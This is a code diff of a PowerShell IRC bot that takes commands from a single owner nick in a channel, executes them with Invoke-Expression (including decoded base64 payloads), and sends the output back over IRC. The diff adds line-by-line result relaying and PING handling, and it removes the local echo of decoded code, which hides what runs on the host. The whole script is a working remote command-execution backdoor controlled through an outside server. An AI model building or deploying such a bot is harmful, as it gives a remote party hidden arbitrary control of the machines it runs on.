@@ -5,6 +5,27 @@ $channel = "#SCRIPT-POWERSHELL"
 $owner = "The-oo"
 $date = Get-Date
 
+$color = "green","yellow","magenta"
+
+function object_to_multistring{
+     param($rawsingleString)
+     $fulltext = @()
+     $tata = ""
+     for ($i = 0; $i -lt $rawsingleString.length; $i++){
+         if([int][char]$rawsingleString[$i]-eq 13){
+             $fulltext += $tata
+             $tata = ''
+         }
+         elseif([int][char]$rawsingleString[$i]-eq 10){}
+         else{
+             $tata +=$rawsingleString[$i]
+         }
+     }
+     $fulltext += $tata
+     return $fulltext
+}
+
+
 
 
 # Connect-session
@@ -49,13 +70,15 @@ do {
 
 
 
+
+
 do {
     $read = $reader.ReadLine();
     write-host $read  
 
     $user = $read.Split("!")[0]
 
-    if(($read.Split("!")[0]) -like ':' + $owner) {
+    if(($read.Split("!")[0]) -eq ':' + $owner) {
         if ($read -like '*stop_powershell*') {
             $writer.WriteLine("QUIT")
             $read = $reader.ReadLine();
@@ -73,7 +96,17 @@ do {
 
             try {
                 $result = Invoke-Expression $command
-                $writer.WriteLine("PRIVMSG " + $owner + " :" + $result)
+                $result_string = (($result | Format-list | Out-String) -replace '(?m)^\s*?\n') -replace (":","=")
+                
+                if ([int][char]($result_string.Substring($result_string.length-1)) -eq 10) {
+                    $result_string = $result_string.Substring(0,$result_string.Length-1)
+                }
+                
+                foreach ($line in (object_to_multistring -rawsingleString $result_string)) {
+                    $writer.WriteLine("PRIVMSG " + $owner + " :" + $line)
+                    Write-Host $line -Fore ($color | Get-Random)
+                    Start-Sleep -Milliseconds 150
+                }
             } catch {
                 $writer.WriteLine("PRIVMSG " + $owner + " :La commande suivante a echoue --> " + $command)
             }
@@ -84,8 +117,6 @@ do {
             $code = $value[1]
 
             try {
-                write-host $code
-
                 $decoded = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($code))
                 
                 $result = Invoke-Expression $decoded
@@ -102,6 +133,10 @@ do {
     if ($read -like '*' + $hostname + '*') {
         $writer.WriteLine("PRIVMSG " + $owner + " :" + $read)
         Start-Sleep -Milliseconds 150
+    }
+    if ($read -eq 'PING ' + $hostname) {
+        $writer.WriteLine("PONG " + $hostname)
+        write-host pong
     }
 
 
